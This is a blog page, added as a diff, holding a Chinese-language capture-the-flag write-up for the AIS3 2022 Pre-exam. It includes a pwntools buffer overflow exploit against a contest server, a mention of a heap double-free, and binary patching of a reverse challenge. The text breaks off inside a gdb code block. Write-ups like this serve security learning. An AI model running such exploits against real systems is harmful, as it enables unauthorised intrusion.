@@ -1,0 +1,1098 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="atx0mg">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="atx0mg">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="Overview 今年打 AIS3 的 Pre-exam，這次總共解了 8 題（不包括 Welcome），剩下的題目的解法有些是參考別人的 writeup Read More →">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 2022 Pre-exam">
+<meta property="og:url" content="https://jeff14994.github.io/2022/07/04/AIS3-2022-Pre-exam/index.html">
+<meta property="og:site_name" content="atx0mg">
+<meta property="og:description" content="Overview 今年打 AIS3 的 Pre-exam，這次總共解了 8 題（不包括 Welcome），剩下的題目的解法有些是參考別人的 writeup Read More →">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/BytnBp-Dq.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJVXSRZvc.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJk_9abw5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJISM0Zvc.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkZKzAbwq.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkfzFQys5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJt8rR-Pq.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryK8rRbD5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H15IH0-v9.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkYLrRWPq.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H17OFCbv5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJ-FtCZwc.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkV2j0ZDc.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkjDs0bv9.jpg">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJTBe1MP5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hy5_xyGPc.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryOwlyzv5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1xDZ1zw5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1xDWkfw9.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJlgPbyMD5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyHu_YAq5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyJvz90c5.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy2KotC99.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkJsiYAqq.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1VSmXksq.png">
+<meta property="article:published_time" content="2022-07-04T09:04:03.000Z">
+<meta property="article:modified_time" content="2025-04-10T03:37:48.562Z">
+<meta property="article:author" content="atx0mg">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="AIS3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/BytnBp-Dq.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/portfolio.ico">
+    
+    <title>AIS3 2022 Pre-exam · atx0mg&#39;s Fortress</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>atx0mg's Fortress.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">atx0mg&#39;s Fortress.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">AIS3 2022 Pre-exam</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                AIS3 2022 Pre-exam
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="AIS3">AIS3</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.5k</span>Reading time: <span class="post-count reading-time">13 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/07/04</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><img src="https://hackmd.io/_uploads/BytnBp-Dq.png"></p>
+<p>今年打 <a target="_blank" rel="noopener" href="https://ais3.org/">AIS3 的 Pre-exam</a>，這次總共解了 8 題（不包括 Welcome），剩下的題目的解法有些是參考別人的 writeup</p>
+<p><a href="https://jeff14994.github.io/2022/07/04/AIS3-2022-Pre-exam/" target="_self">Read More →</a></p>
+<span id="more"></span>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="[Pwn]"></a>[Pwn]</h2><h3 id="BOF2WIN"><a href="#BOF2WIN" class="headerlink" title="BOF2WIN"></a><code>BOF2WIN</code></h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s!\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到第 8 行有 <code>gets</code> 漏洞，不會檢查邊界，因此可以 Buffer overflow 並控制 RIP<br>而 RIP 要跳到哪一個地址？在看過 IDA Pro 後可以發現到 <code>get_the_flag()</code> 的函式</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_the_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">7</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/home/bof2win/flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以透過<code>get_the_flag()</code> 的組合語言模式來找該記憶體位置，記憶體位置在 <code>0x401216</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000401216</span> F3 <span class="number">0F</span> <span class="number">1</span>E FA             endbr64</span><br><span class="line">.text:<span class="number">000000000040121</span>A <span class="number">55</span>                      push    rbp</span><br><span class="line">.text:<span class="number">000000000040121B</span> <span class="number">48</span> <span class="number">89</span> E5                mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040121</span>E <span class="number">48</span> <span class="number">83</span> EC <span class="number">40</span>             sub     rsp, <span class="number">40</span>h</span><br><span class="line">.text:<span class="number">0000000000401222</span> <span class="number">48</span> C7 <span class="number">45</span> C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+buf], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040122</span>A <span class="number">48</span> C7 <span class="number">45</span> C8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_38], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401232</span> <span class="number">48</span> C7 <span class="number">45</span> D0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_30], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040123</span>A <span class="number">48</span> C7 <span class="number">45</span> D8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_28], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401242</span> <span class="number">48</span> C7 <span class="number">45</span> E0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_20], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040124</span>A <span class="number">48</span> C7 <span class="number">45</span> E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> mov     [rbp+var_18], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401252</span> BE <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     esi, <span class="number">0</span>          ; oflag</span><br><span class="line">.text:<span class="number">0000000000401257</span> <span class="number">48</span> <span class="number">8</span>D <span class="number">3</span>D A6 <span class="number">0</span>D <span class="number">00</span> <span class="number">00</span>    lea     rdi, file       ; <span class="string">&quot;/home/bof2win/flag&quot;</span></span><br><span class="line">.text:<span class="number">000000000040125</span>E B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401263</span> E8 B8 FE FF FF          call    _open</span><br></pre></td></tr></table></figure>
+
+<h4 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code:"></a>Exploit Code:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">padding = cyclic_find(<span class="string">&quot;gaaa&quot;</span>)</span><br><span class="line">usefulFunction_adr = <span class="number">0x401216</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;chals1.ais3.org&quot;</span>, <span class="number">12347</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = gdb.debug(&quot;./bof2win&quot;, gdbscript=gdbscript)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(padding)</span></span><br><span class="line"><span class="comment">#  1 - Fill the padding</span></span><br><span class="line">padding = <span class="string">&quot;A&quot;</span> * padding</span><br><span class="line"><span class="comment">#payload = padding.encode()</span></span><br><span class="line">payload = padding</span><br><span class="line">payload += p64(usefulFunction_adr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h4><p><img src="https://hackmd.io/_uploads/SJVXSRZvc.png"></p>
+<h4 id="Got-flag-AIS3-Re-1-B0F-m4st3r"><a href="#Got-flag-AIS3-Re-1-B0F-m4st3r" class="headerlink" title="Got flag: AIS3{Re@1_B0F_m4st3r!!}"></a>Got flag: <code>AIS3&#123;Re@1_B0F_m4st3r!!&#125;</code></h4><h3 id="SAAS-Crash"><a href="#SAAS-Crash" class="headerlink" title="SAAS - Crash"></a><code>SAAS - Crash</code></h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>Heap 的 double free attack (有點半矇到, 但 flag is flag lol)</p>
+<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p><img src="https://hackmd.io/_uploads/BJk_9abw5.png"></p>
+<h4 id="Got-flag-AIS3-congrats-on-crashing-my-editor-but-can-you-get-shell-from-it"><a href="#Got-flag-AIS3-congrats-on-crashing-my-editor-but-can-you-get-shell-from-it" class="headerlink" title="Got flag: AIS3{congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?}"></a>Got flag: <code>AIS3&#123;congrats_on_crashing_my_editor!_but_can_you_get_shell_from_it?&#125;</code></h4><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="[Reverse]"></a>[Reverse]</h2><h3 id="Time-Management"><a href="#Time-Management" class="headerlink" title="Time Management"></a><code>Time Management</code></h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>一看到題目是 time management，我第一直覺是 <code>sleep()</code>，剛好在題目裡也有看到，所以就特別留意</p>
+<p>丟進 IDA Decompile 完，可以看到第 13 行有一個 <code>sleep(0x8763)</code>，會造成整個程式卡住，因此我想說能否 patch 掉這個函式？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you have enough time to receive my flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">23</span>; i += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(_DWORD *)&amp;secret[<span class="number">4</span> * i] ^ key[*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;secret[<span class="number">4</span> * i + <span class="number">4</span>]];</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      sleep(<span class="number">0x8763</span>u);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, v4);</span><br><span class="line">      v4 &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\rOops! Where is the flag? I am sure that the flag is already printed!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根據 IDA 發現 sleep 的 offset 在 <code>0x122B</code> ，該 instruction code 是 <code>BF 63 87 00 00 E8 7B FE FF FF</code>，透過 010 Editor 便可以 patch 掉</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000000122B</span>                         loc_122B:               ; seconds</span><br><span class="line">.text:<span class="number">000000000000122B</span> BF <span class="number">63</span> <span class="number">87</span> <span class="number">00</span> <span class="number">00</span>          mov     edi, <span class="number">8763</span>h</span><br><span class="line">.text:<span class="number">0000000000001230</span> E8 <span class="number">7B</span> FE FF FF          call    _sleep</span><br></pre></td></tr></table></figure>
+<p>patch 完後長這樣</p>
+<p><img src="https://hackmd.io/_uploads/SJISM0Zvc.png"></p>
+<h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><p>接著再把它丟回 <code>gdb</code>，設斷點在 <code>printf</code>，每次 4 個 byte 從 <code>RSI</code> 的把 flag leak 出來</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 